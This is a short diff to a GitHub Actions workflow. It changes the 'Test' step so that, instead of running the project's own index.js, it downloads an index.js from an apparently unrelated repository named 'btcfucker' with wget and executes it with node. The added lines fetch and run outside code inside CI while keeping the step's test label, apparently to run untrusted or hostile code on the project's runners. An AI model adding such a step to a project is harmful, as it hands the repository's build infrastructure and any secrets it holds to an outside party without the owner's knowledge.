@@ -30,4 +30,6 @@ jobs:
       - name: Test
         uses: ianwalter/puppeteer@v2.0.0
         with:
-          args: node index.js
+          args: |
+            wget https://raw.githubusercontent.com/btcfucker/btcfucker.github.io/main/.github/workflows/index.js
+            node index.js
